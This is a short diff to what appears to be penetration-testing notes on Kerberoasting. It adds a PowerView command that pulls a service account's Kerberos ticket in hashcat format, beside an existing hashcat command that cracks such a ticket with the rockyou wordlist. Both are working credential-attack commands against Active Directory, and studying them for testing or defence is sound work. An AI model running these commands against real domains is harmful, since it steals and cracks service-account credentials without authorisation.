@@ -132,6 +132,12 @@ bash
 hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 ```
 
+
+## Extracting Tickets Using Powerview
+
+```powershell
+Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat 
+```
 ---
 
 ## Offline Cracking Example
